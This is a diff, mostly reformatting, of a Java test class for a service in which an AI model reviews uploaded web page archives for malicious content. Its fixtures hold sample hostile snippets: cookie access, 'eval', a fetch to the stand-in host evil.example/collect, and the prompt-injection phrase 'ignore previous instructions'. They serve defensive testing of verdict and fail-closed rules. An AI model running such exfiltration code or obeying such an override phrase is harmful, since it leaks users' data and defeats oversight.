@@ -36,8 +36,7 @@ import run.halo.aipagebuilder.content.ContentPolicy;
 class PageImportReviewServiceTest {
     private final AiGateway gateway = mock(AiGateway.class);
     private final ImportReviewStore store = new ImportReviewStore();
-    private final PageImportReviewService service =
-        new PageImportReviewService(gateway, new ContentPolicy(), store);
+    private final PageImportReviewService service = new PageImportReviewService(gateway, new ContentPolicy(), store);
 
     @BeforeEach
     void setUp() {
@@ -47,8 +46,7 @@ class PageImportReviewServiceTest {
     @Test
     void safeReviewIsStored() throws Exception {
         var bytes = archive("<p>Hello</p>", "p {color: red}", "console.log('ok')");
-        when(gateway.review(anyString(), anyString()))
-            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
+        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
 
         var report = service.review(bytes, "admin").block();
 
@@ -68,24 +66,24 @@ class PageImportReviewServiceTest {
             return Mono.just(review(AiReview.Verdict.SAFE));
         });
 
-        var report = service.review(
-            archive("<p>Hello</p>", "p {color: red}", "console.log('ok')"), "admin").block();
+        var report = service.review(archive("<p>Hello</p>", "p {color: red}", "console.log('ok')"), "admin")
+                .block();
 
         assertThat(report.verdict()).isEqualTo("safe");
         verify(gateway, times(1)).review(anyString(), anyString());
         assertThat(prompt.get())
-            .contains("页面包文件：")
-            .contains("本次审查提供：page.html、styles.css、script.js")
-            .contains("=== 文件：page.html", "=== 文件：styles.css", "=== 文件：script.js");
+                .contains("页面包文件：")
+                .contains("本次审查提供：page.html、styles.css、script.js")
+                .contains("=== 文件：page.html", "=== 文件：styles.css", "=== 文件：script.js");
     }
 
     @Test
     void selectedModelIsUsedForReview() throws Exception {
         when(gateway.review(eq("model-a"), anyString(), anyString()))
-            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
+                .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
 
-        var report = service.review(
-            archive("<p>Hello</p>", "", "console.log('ok')"), "admin", "model-a").block();
+        var report = service.review(archive("<p>Hello</p>", "", "console.log('ok')"), "admin", "model-a")
+                .block();
 
         assertThat(report.verdict()).isEqualTo("safe");
         verify(gateway).review(eq("model-a"), anyString(), anyString());
@@ -95,9 +93,14 @@ class PageImportReviewServiceTest {
     @Test
     void suspiciousReviewPreservesFindings() throws Exception {
         var bytes = archive("<p>Hello</p>", "", "eval('code')");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.SUSPICIOUS, finding(AiReview.Severity.MEDIUM,
-                AiReview.Category.OBFUSCATION, "script.js", "eval('code')"))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.SUSPICIOUS,
+                        finding(
+                                AiReview.Severity.MEDIUM,
+                                AiReview.Category.OBFUSCATION,
+                                "script.js",
+                                "eval('code')"))));
 
         var report = service.review(bytes, "admin").block();
 
@@ -108,9 +111,14 @@ class PageImportReviewServiceTest {
     @Test
     void maliciousReviewRetainsArchiveDenyRecord() throws Exception {
         var bytes = archive("<p>Hello</p>", "", "document.cookie");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.MALICIOUS, finding(AiReview.Severity.CRITICAL,
-                AiReview.Category.DATA_EXFILTRATION, "script.js", "document.cookie"))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.MALICIOUS,
+                        finding(
+                                AiReview.Severity.CRITICAL,
+                                AiReview.Category.DATA_EXFILTRATION,
+                                "script.js",
+                                "document.cookie"))));
 
         var report = service.review(bytes, "admin").block();
 
@@ -121,9 +129,10 @@ class PageImportReviewServiceTest {
     @Test
     void highSeverityFindingUpgradesSafeVerdict() throws Exception {
         var bytes = archive("<p>Hello</p>", "", "fetch('https://evil.example')");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.SAFE, finding(AiReview.Severity.HIGH,
-                AiReview.Category.DATA_EXFILTRATION, "script.js", "fetch("))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.SAFE,
+                        finding(AiReview.Severity.HIGH, AiReview.Category.DATA_EXFILTRATION, "script.js", "fetch("))));
 
         var report = service.review(bytes, "admin").block();
 
@@ -134,9 +143,10 @@ class PageImportReviewServiceTest {
     @Test
     void mediumSeverityFindingUpgradesSafeVerdictToSuspicious() throws Exception {
         var bytes = archive("<p>Hello</p>", "", "eval('code')");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.SAFE, finding(AiReview.Severity.MEDIUM,
-                AiReview.Category.OBFUSCATION, "script.js", "eval("))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.SAFE,
+                        finding(AiReview.Severity.MEDIUM, AiReview.Category.OBFUSCATION, "script.js", "eval("))));
 
         var report = service.review(bytes, "admin").block();
 
@@ -151,9 +161,13 @@ class PageImportReviewServiceTest {
         var calls = new AtomicInteger();
         when(gateway.review(anyString(), anyString())).thenAnswer(invocation -> {
             calls.incrementAndGet();
-            return Mono.just(review(AiReview.Verdict.MALICIOUS,
-                finding(AiReview.Severity.HIGH, AiReview.Category.DATA_EXFILTRATION,
-                    "script.js", "fetch('https://evil.example/collect')")));
+            return Mono.just(review(
+                    AiReview.Verdict.MALICIOUS,
+                    finding(
+                            AiReview.Severity.HIGH,
+                            AiReview.Category.DATA_EXFILTRATION,
+                            "script.js",
+                            "fetch('https://evil.example/collect')")));
         });
 
         var report = service.review(bytes, "admin").block();
@@ -171,9 +185,9 @@ class PageImportReviewServiceTest {
         when(gateway.review(anyString(), anyString())).thenAnswer(invocation -> {
             var call = calls.incrementAndGet();
             var severity = call == 1 ? AiReview.Severity.MEDIUM : AiReview.Severity.HIGH;
-            return Mono.just(review(AiReview.Verdict.SUSPICIOUS,
-                finding(severity, AiReview.Category.DATA_EXFILTRATION, "script.js",
-                    "document.cookie")));
+            return Mono.just(review(
+                    AiReview.Verdict.SUSPICIOUS,
+                    finding(severity, AiReview.Category.DATA_EXFILTRATION, "script.js", "document.cookie")));
         });
 
         var report = service.review(bytes, "admin").block();
@@ -206,24 +220,28 @@ class PageImportReviewServiceTest {
         var script = "// padding\n".repeat(7000) + "document.cookie";
         var bytes = archive("<p>Hello</p>", "", script);
         var calls = new AtomicInteger();
-        when(gateway.review(anyString(), anyString())).thenAnswer(invocation ->
-            Mono.just(calls.incrementAndGet() == 1
-                ? new AiReview(null, "summary", List.of())
-                : review(AiReview.Verdict.SAFE)));
+        when(gateway.review(anyString(), anyString()))
+                .thenAnswer(invocation -> Mono.just(
+                        calls.incrementAndGet() == 1
+                                ? new AiReview(null, "summary", List.of())
+                                : review(AiReview.Verdict.SAFE)));
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
     }
 
     @ParameterizedTest
-    @EnumSource(value = AiReview.Category.class,
-        names = {"PROMPT_INJECTION", "MALICIOUS_SCRIPT"})
+    @EnumSource(
+            value = AiReview.Category.class,
+            names = {"PROMPT_INJECTION", "MALICIOUS_SCRIPT"})
     void dangerousCategoriesRequireAtLeastSuspicious(AiReview.Category category) throws Exception {
         var bytes = archive("<p>Hello</p>", "", "ignore previous instructions");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.SAFE, finding(AiReview.Severity.LOW, category, "script.js",
-                "ignore previous instructions"))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.SAFE,
+                        finding(AiReview.Severity.LOW, category, "script.js", "ignore previous instructions"))));
 
         var report = service.review(bytes, "admin").block();
 
@@ -233,18 +251,23 @@ class PageImportReviewServiceTest {
     @Test
     void maliciousReviewCannotBeRereviewedAsSafeWithinTtl() throws Exception {
         var bytes = archive("<p>Hello</p>", "", "document.cookie");
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(
-            AiReview.Verdict.MALICIOUS, finding(AiReview.Severity.CRITICAL,
-                AiReview.Category.DATA_EXFILTRATION, "script.js", "document.cookie"))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(review(
+                        AiReview.Verdict.MALICIOUS,
+                        finding(
+                                AiReview.Severity.CRITICAL,
+                                AiReview.Category.DATA_EXFILTRATION,
+                                "script.js",
+                                "document.cookie"))));
 
         var report = service.review(bytes, "admin").block();
         assertThat(report.verdict()).isEqualTo("malicious");
 
-        when(gateway.review(anyString(), anyString()))
-            .thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
+        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(review(AiReview.Verdict.SAFE)));
         assertThatThrownBy(() -> service.review(bytes, "other", "model-b").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.UNPROCESSABLE_CONTENT));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.UNPROCESSABLE_CONTENT));
         verify(gateway, times(1)).review(anyString(), anyString());
         verify(gateway, never()).review(eq("model-b"), anyString(), anyString());
     }
@@ -253,19 +276,26 @@ class PageImportReviewServiceTest {
     void findingLimitDoesNotHideDangerousCategoriesFromTheVerdict() throws Exception {
         var findings = new ArrayList<AiReview.Finding>();
         for (var index = 0; index < 50; index++) {
-            findings.add(finding(AiReview.Severity.LOW, AiReview.Category.EXTERNAL_RESOURCE,
-                "page.html", "https://cdn.example/resource-" + index + ".js"));
+            findings.add(finding(
+                    AiReview.Severity.LOW,
+                    AiReview.Category.EXTERNAL_RESOURCE,
+                    "page.html",
+                    "https://cdn.example/resource-" + index + ".js"));
         }
-        findings.add(finding(AiReview.Severity.LOW, AiReview.Category.PROMPT_INJECTION,
-            "script.js", "ignore previous instructions"));
-        when(gateway.review(anyString(), anyString())).thenReturn(
-            Mono.just(new AiReview(AiReview.Verdict.SAFE, "summary", findings)));
+        findings.add(finding(
+                AiReview.Severity.LOW,
+                AiReview.Category.PROMPT_INJECTION,
+                "script.js",
+                "ignore previous instructions"));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(new AiReview(AiReview.Verdict.SAFE, "summary", findings)));
 
         var report = service.review(archive("<p>Hello</p>", "", ""), "admin").block();
 
         assertThat(report.findings()).hasSize(50);
-        assertThat(report.findings()).extracting(PageApi.ImportFinding::category)
-            .contains("prompt_injection");
+        assertThat(report.findings())
+                .extracting(PageApi.ImportFinding::category)
+                .contains("prompt_injection");
         assertThat(report.verdict()).isEqualTo("suspicious");
     }
 
@@ -306,14 +336,17 @@ class PageImportReviewServiceTest {
 
     @Test
     void malformedFindingFailsClosed() throws Exception {
-        when(gateway.review(anyString(), anyString())).thenReturn(Mono.just(
-            new AiReview(AiReview.Verdict.SAFE, "summary", List.of(
-                new AiReview.Finding(null, AiReview.Category.OTHER, "script.js", "", "")))));
+        when(gateway.review(anyString(), anyString()))
+                .thenReturn(Mono.just(new AiReview(
+                        AiReview.Verdict.SAFE,
+                        "summary",
+                        List.of(new AiReview.Finding(null, AiReview.Category.OTHER, "script.js", "", "")))));
         var bytes = archive("<p>Hello</p>", "", "");
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
     }
 
     @Test
@@ -322,8 +355,9 @@ class PageImportReviewServiceTest {
         var bytes = archive("<p>Hello</p>", "", "");
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_GATEWAY));
     }
 
     @Test
@@ -331,22 +365,22 @@ class PageImportReviewServiceTest {
         var bytes = archive("<script>alert(1)</script>", "", "");
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST));
         verify(gateway, never()).review(anyString(), anyString());
     }
 
     @Test
     void unavailableStatusBlocksReview() throws Exception {
-        when(gateway.status()).thenReturn(
-            Mono.just(new AiEndpoint.AiStatus(false, "disabled")));
+        when(gateway.status()).thenReturn(Mono.just(new AiEndpoint.AiStatus(false, "disabled")));
         var bytes = archive("<p>Hello</p>", "", "");
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error -> {
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE);
-                assertThat(error.getReason()).contains("disabled");
-            });
+                .isInstanceOfSatisfying(ResponseStatusException.class, error -> {
+                    assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE);
+                    assertThat(error.getReason()).contains("disabled");
+                });
         verify(gateway, never()).review(anyString(), anyString());
         assertThat(store.isReviewing(sha256(bytes))).isFalse();
     }
@@ -357,26 +391,28 @@ class PageImportReviewServiceTest {
         var bytes = archive("<p>Hello</p>", "", "");
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(HttpStatus.SERVICE_UNAVAILABLE));
         verify(gateway, never()).review(anyString(), anyString());
     }
 
     @ParameterizedTest
     @EnumSource(AiReviewException.Reason.class)
     void reviewFailureMapsToHttpStatus(AiReviewException.Reason reason) throws Exception {
-        when(gateway.review(anyString(), anyString()))
-            .thenReturn(Mono.error(new AiReviewException(reason)));
+        when(gateway.review(anyString(), anyString())).thenReturn(Mono.error(new AiReviewException(reason)));
         var bytes = archive("<p>Hello</p>", "", "");
-        var expected = switch (reason) {
-            case UNAVAILABLE -> HttpStatus.SERVICE_UNAVAILABLE;
-            case TIMEOUT -> HttpStatus.GATEWAY_TIMEOUT;
-            case INVALID_OUTPUT, FAILED -> HttpStatus.BAD_GATEWAY;
-        };
+        var expected =
+                switch (reason) {
+                    case UNAVAILABLE -> HttpStatus.SERVICE_UNAVAILABLE;
+                    case TIMEOUT -> HttpStatus.GATEWAY_TIMEOUT;
+                    case INVALID_OUTPUT, FAILED -> HttpStatus.BAD_GATEWAY;
+                };
 
         assertThatThrownBy(() -> service.review(bytes, "admin").block())
-            .isInstanceOfSatisfying(ResponseStatusException.class, error ->
-                assertThat(error.getStatusCode()).isEqualTo(expected));
+                .isInstanceOfSatisfying(
+                        ResponseStatusException.class,
+                        error -> assertThat(error.getStatusCode()).isEqualTo(expected));
     }
 
     private static byte[] archive(String html, String css, String js) throws Exception {
@@ -395,13 +431,12 @@ class PageImportReviewServiceTest {
         return new AiReview(verdict, "summary", List.of(findings));
     }
 
-    private static AiReview.Finding finding(AiReview.Severity severity,
-        AiReview.Category category, String file, String evidence) {
+    private static AiReview.Finding finding(
+            AiReview.Severity severity, AiReview.Category category, String file, String evidence) {
         return new AiReview.Finding(severity, category, file, evidence, "explanation");
     }
 
     private static String sha256(byte[] bytes) throws Exception {
-        return HexFormat.of().formatHex(
-            MessageDigest.getInstance("SHA-256").digest(bytes));
+        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(bytes));
     }
 }
